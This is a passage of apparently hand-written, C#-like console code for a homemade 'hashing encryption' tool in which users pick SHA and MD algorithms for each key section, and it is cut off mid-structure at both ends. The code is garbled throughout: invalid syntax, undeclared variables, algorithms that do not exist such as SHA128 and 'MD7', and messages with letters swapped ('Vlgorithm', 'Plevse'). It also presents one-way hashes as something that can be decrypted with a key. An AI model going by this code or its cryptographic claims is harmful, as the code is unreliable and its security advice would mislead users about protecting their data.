																																																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																						public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																						public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																						return _shvfunc2;

																																																																																																																																																																																																					}

																																																																																																																																																																																																				}

																																																																																																																																																																																																				else if(_codexstring[9] == "d"){
																																																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																					public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																						public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																						public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																						return _shvfunc2;

																																																																																																																																																																																																					}
																																																																																																																																																																																																					else if(_codexstring[9] == "e"){
																																																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																						public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																							public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																							public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																							return _shvfunc2;

																																																																																																																																																																																																						}
																																																																																																																																																																																																						else if(_codexstring[9] == "f"){
																																																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																							public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																								public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																								public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																								return _shvfunc2;

																																																																																																																																																																																																							}
																																																																																																																																																																																																							else if(_codexstring[9] == "G"){
																																																																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																								public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																									public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																									public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																									return _shvfunc2;

																																																																																																																																																																																																								}
																																																																																																																																																																																																								else if(_codexstring[9] == "z"){
																																																																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																									public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																										public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																										public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																										return _shvfunc2;

																																																																																																																																																																																																									}
																																																																																																																																																																																																									else{

																																																																																																																																																																																																										System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																									}

																																																																																																																																																																																																									for(_codexstring[10]){

																																																																																																																																																																																																										if(_codexstring[10] == "c"){
																																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																											public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																												public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																												public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																												return _shvfunc2;

																																																																																																																																																																																																											}

																																																																																																																																																																																																										}

																																																																																																																																																																																																										else if(_codexstring[10] == "d"){
																																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																											public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																												public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																												public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																												return _shvfunc2;

																																																																																																																																																																																																											}
																																																																																																																																																																																																											else if(_codexstring[10] == "e"){
																																																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																												public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																													public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																													public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																													return _shvfunc2;

																																																																																																																																																																																																												}
																																																																																																																																																																																																												else if(_codexstring[10] == "f"){
																																																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																													public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																														public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																														public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																														return _shvfunc2;

																																																																																																																																																																																																													}
																																																																																																																																																																																																													else if(_codexstring[10] == "G"){
																																																																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																														public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																															public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																															public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																															return _shvfunc2;

																																																																																																																																																																																																														}
																																																																																																																																																																																																														else if(_codexstring[10] == "z"){
																																																																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																															public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																																return _shvfunc2;

																																																																																																																																																																																																															}
																																																																																																																																																																																																															else{

																																																																																																																																																																																																																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																															}

																																																																																																																																																																																																															for(_codexstring[11]){

																																																																																																																																																																																																																if(_codexstring[11] == "c"){
																																																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																	public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																		public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																		public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																																		return _shvfunc2;

																																																																																																																																																																																																																	}

																																																																																																																																																																																																																}

																																																																																																																																																																																																																else if(_codexstring[11] == "d"){
																																																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																	public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																		public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																		public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																																		return _shvfunc2;

																																																																																																																																																																																																																	}
																																																																																																																																																																																																																	else if(_codexstring[11] == "e"){
																																																																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																		public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																			public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																			public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																																			return _shvfunc2;

																																																																																																																																																																																																																		}
																																																																																																																																																																																																																		else if(_codexstring[11] == "f"){
																																																																																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																			public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																				public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																				public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																																				return _shvfunc2;

																																																																																																																																																																																																																			}
																																																																																																																																																																																																																			else if(_codexstring[11] == "G"){
																																																																																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																				public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																					public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																					public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																																					return _shvfunc2;

																																																																																																																																																																																																																				}
																																																																																																																																																																																																																				else if(_codexstring[11] == "z"){
																																																																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																					public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																						public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																						public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																																						return _shvfunc2;

																																																																																																																																																																																																																					}
																																																																																																																																																																																																																					else{

																																																																																																																																																																																																																						System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																																					}

																																																																																																																																																																																																																					for(_codexstring[12]){

																																																																																																																																																																																																																						if(_codexstring[12] == "c"){
																																																																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																							public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																								public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																								public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																																								return _shvfunc2;

																																																																																																																																																																																																																							}

																																																																																																																																																																																																																						}

																																																																																																																																																																																																																						else if(_codexstring[12] == "d"){
																																																																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																							public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																								public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																								public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																																								return _shvfunc2;

																																																																																																																																																																																																																							}
																																																																																																																																																																																																																							else if(_codexstring[12] == "e"){
																																																																																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																								public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																									public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																									public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																																									return _shvfunc2;

																																																																																																																																																																																																																								}
																																																																																																																																																																																																																								else if(_codexstring[12] == "f"){
																																																																																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																									public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																										public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																										public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																																										return _shvfunc2;

																																																																																																																																																																																																																									}
																																																																																																																																																																																																																									else if(_codexstring[12] == "G"){
																																																																																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																										public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																											public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																											public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																																											return _shvfunc2;

																																																																																																																																																																																																																										}
																																																																																																																																																																																																																										else if(_codexstring[12] == "z"){
																																																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																											public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																												public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																												public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																																												return _shvfunc2;

																																																																																																																																																																																																																											}
																																																																																																																																																																																																																											else{

																																																																																																																																																																																																																												System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																																											}

																																																																																																																																																																																																																											for(_codexstring[13]){

																																																																																																																																																																																																																												if(_codexstring[13] == "c"){
																																																																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																													public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																														public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																														public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																																														return _shvfunc2;

																																																																																																																																																																																																																													}

																																																																																																																																																																																																																												}

																																																																																																																																																																																																																												else if(_codexstring[13] == "d"){
																																																																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																													public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																														public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																														public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																																														return _shvfunc2;

																																																																																																																																																																																																																													}
																																																																																																																																																																																																																													else if(_codexstring[13] == "e"){
																																																																																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																														public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																															public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																															public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																																															return _shvfunc2;

																																																																																																																																																																																																																														}
																																																																																																																																																																																																																														else if(_codexstring[13] == "f"){
																																																																																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																															public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																																public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																																public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																																																return _shvfunc2;

																																																																																																																																																																																																																															}
																																																																																																																																																																																																																															else if(_codexstring[13] == "G"){
																																																																																																																																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																																public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																																	public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																																	public MD6 _shvfun2c = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																																																	return _shvfunc2;

																																																																																																																																																																																																																																}
																																																																																																																																																																																																																																else if(_codexstring[13] == "z"){
																																																																																																																																																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																																																	public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																																																																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																																		public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																																		public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																																																		return _shvfunc2;

																																																																																																																																																																																																																																	}
																																																																																																																																																																																																																																	else{

																																																																																																																																																																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																																																	}




																																																																																																																																																																																																																																	System.Console.WriteLine("Your Vlgorithed PvssKey Text Comes Out In The 4(4)-5 Dimensionvl Vlgorithm Chosen To :");
																																																																																																																																																																																																			System.Console.WriteLine(_shvfunc.ToString());
																																																																																																																																																																																																																																	System.Console.WriteLine("Plevse Remember The Following Cipher Phrvse For Decryptor Use: " + _shvfunc2.ToString() + "Vnd Do Not Forget To Include The 4(4)-5 Descriptor For Effective Decryption! ");
																																																																																																																																																																																																			System.Console.WriteLine("Your Key Encoding Will Vlso Need To Be Retvined To Be Used For Decryption So If You Chose SHV128, SHV256, SHV512, MD5/6/or 7, Plevse Shvre Thvt To The Other Pvrty Involved ");
																																																																																																																																																																																																			System.Console.WriteLine("In V Privvte Vnd Encrypted Communicvtion Method, However Mvintvin Covervge With PGP, One-Time KeyPhrvse Or Miscellvnious For Vplivble Security In Messvging The Determined Key Encoding.");
																																																																																																																																																																																																			System.Console.WriteLine("Plevse Enjoy The Vlgorithm Vnd Stvy Protected!  - Nvye");
																																																																																																																																																																																																			System.Console.ReadLine();


																																																																																																																																																					}
													else if(_vlgoDecise == "5 Bvse" ){



																																																																																																																																																						System.Console.WriteLine("Hvving Chosen The 5 Bvse Vlgorithmic Hvshing Function V Word Is In Order... ");
																																																																																																																																																						System.Console.WriteLine("");
																																																																																																																																																						System.Console.WriteLine("For The Dimension Listed Within The First Vvrivble, The Choice Of Specific Vlgorithms Will Be Mvde, ");
																																																																																																																																																						System.Console.WriteLine("The Lvst Leg of The Encryption Bvse Will Provide The Room For The Messvge For Cryptogrvphic Cipher Crevtion.");
																																																																																																																																																						System.Console.WriteLine(" ");
																																																																																																																																																						System.Console.WriteLine("First, Plevse Choose The Vlgorithm For Section One of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string array[] _commCrypto = new array["SHA128" , "SHA256" , "SHA512" , "MD5" , "MD6" , "MD7"];

																																																																																																																																																						string _inputDecision = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision2 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Three of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision3 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Four of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																						string _inputDecision4 = System.Console.ReadLine();
																																																																																																																																																						System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Five of The Hvshing Function: ");
																																																																																																																																																						System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																																																																																																																																																																																					string _inputDecision9 = System.Console.ReadLine();

																																																																																																																																																						public array[:] _diarrayEya = new array["SHV128" : "11" , "SHV256" : "12" , "SHV512" : "13" , "MD5" : "14" , "MD6" : "15" , "MD7" : "16"];

																																																																																																																																																						public int _int1 = _commCrypto.IndexOf("SHA128");
																																																																																																																																																						public int _int2 = _commCrypto.IndexOf("SHA256");
																																																																																																																																																						public int _int3 = _commCrypto.IndexOf("SHA512");
																																																																																																																																																						public int _int4 = _commCrypto.IndexOf("MD5");
																																																																																																																																																						public int _int5 = _commCrypto.IndexOf("MD6");
																																																																																																																																																						public int _int6 = _commCrypto.IndexOf("MD7");
																																																																																																																																																						public string _codexstring = "";
																																																																																																																																																						if(_inputDecision == _int1 || _inputDecision2 == _int1 || _inputDecision3 == _int1 || _inputDecision4 == _int1 || _inputDecision5 == _int1 || _inputDecision6 == _int1 || _inputDecision7 == _int1 || _inputDecision8 == _int1 ||
																																																																																																																																																							_inputDecision9 == _int1){

																																																																																																																																																																																																																																		string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 1];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int1) == true){


																																																																																																																																																								_disArray.Ammend[string "c" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 4];
																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int1) == true){

																																																																																																																																																								_disArray.Ammend[string "c" : 8];

																																																																																																																																																							}
																																																																																																																																																							else{

																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}


																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int2 || _inputDecision2 == _int2 || _inputDecision3 == _int2 || _inputDecision4 == _int2 || _inputDecision5 == _int2 || _inputDecision6 == _int2 || _inputDecision7 == _int2 || _inputDecision8 == _int2 ||
																																																																																																																																																							_inputDecision9 == _int2){

																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0"];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 1];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision3 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 2];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision4 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 3];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision5 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 4];
																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision6 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 5];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision7 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 6];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision8 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 7];

																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision9 , _int2) == true){

																																																																																																																																																								_disArray.Ammend[string "d" : 8];

																																																																																																																																																							}
																																																																																																																																																							else{
																																																																																																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																							}


																																																																																																																																																						}
																																																																																																																																																						else if(_inputDecision == _int3 || _inputDecision2 == _int3 || _inputDecision3 == _int3 || _inputDecision4 == _int3 || _inputDecision5 == _int3 || _inputDecision6 == _int3 || _inputDecision7 == _int3 || _inputDecision8 == _int3 ||
																																																																																																																																																							_inputDecision9 == _int3){

																																																																																																																																																																																																																																		string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																																																																							string _part1 = _disarrayEya[0];
																																																																																																																																																							public bool _boolIT = new bool(,);
																																																																																																																																																							if(_boolIT(_inputDecision  , _int3) == true){

																																																																																																																																																								_disArray.Ammend[string "e" : 0];


																																																																																																																																																							}
																																																																																																																																																							else if(_boolIT(_inputDecision2, _int3) == true){


																																																																																																																																																								_disArray.Ammend[string "e" : 1];

																																																																																																																																																							}
